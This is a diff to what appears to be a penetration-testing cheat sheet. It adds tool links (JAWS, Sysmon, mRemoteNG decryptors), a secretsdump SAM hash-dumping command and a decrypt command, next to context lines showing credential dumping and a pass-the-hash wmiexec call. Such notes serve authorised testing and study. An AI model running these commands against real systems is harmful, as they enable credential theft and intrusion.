@@ -571,6 +571,16 @@ python windows-exploit-suggester.py --update
 python windows-exploit-suggester.py -i systeminfo.txt -d 2021-04-23-mssb.xls
 ```
 
+### Just Another Windows (Enum) Script (JAWS)
+
+```bash
+# Download
+https://github.com/411Hall/JAWS.git
+
+# Commands
+
+```
+
 ### WebDav
 
 ```bash
@@ -878,6 +888,7 @@ GetADUsers.py -all bank.local/nik:'Password@123!'-dc-ip 10.10.10.10
 secretsdump.py -just-dc bank.local/nik:'Password@123!'@10.10.10.10
 secretsdump.py -ntds ntds.dit -system system local
 secretsdump.py -ntds ntds.dit -system system local -history
+secretsdump.py -sam SAM -system SYSTEM local
 
 # wmiexec.py
 wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:0405e42853c0f2cb0454964601f27bae administrator@10.10.10.10
@@ -1228,6 +1239,23 @@ sudo apt update
 sudo apt install remmina remmina-plugin-rdp remmina-plugin-secret
 sudo killall remmina
 sudo remmina
+```
+
+### Sysmon
+
+```bash
+# Download
+https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon
+
+# References
+https://github.com/SwiftOnSecurity/sysmon-config
+```
+
+### Scp
+
+```bash
+# Commands
+scp -P 2249 file.txt user@10.10.10.:.
 ```
 
 # C. SUID/CAP/SUDO/GROUP
@@ -1739,7 +1767,7 @@ set rhosts 10.10.10.10
 - https://bond-o.medium.com/sambacry-rce-cve-2017-7494-41c3dcc0b7ae
 ```
 
-# E. CMS/Web
+# E. CMS/Web/Application
 
 ### Wordpress
 
@@ -1923,6 +1951,17 @@ https://www.exploit-db.com/exploits/49584
 # PhreeBooks 5.2.3 ERP - Remote Code Execution
 https://www.exploit-db.com/exploits/49524
 https://www.exploit-db.com/exploits/46645
+```
+
+### Mremoteng
+
+```bash
+# Decrypt
+https://github.com/gquere/mRemoteNG_password_decrypt
+https://github.com/haseebT/mRemoteNG-Decrypt.git
+
+# Commands
+python3 mremoteng_decrypt.py -s "<BASE64>"
 ```
 # F. Reverse Shell
 
